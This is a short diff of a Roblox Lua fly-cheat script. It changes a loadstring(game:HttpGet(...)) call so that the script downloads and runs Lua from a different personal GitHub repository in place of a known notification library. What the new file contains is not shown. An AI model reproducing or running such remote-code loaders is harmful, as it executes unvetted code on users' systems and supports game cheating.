@@ -1,4 +1,4 @@
-local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))();
+local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/PiterNaGitHub/PiterNaGitHub/main/text.lua"))();
 local Notify = AkaliNotif.Notify;
 Notify({
 Description = "simple cframe fly script removedxd on discord for report the bugs";
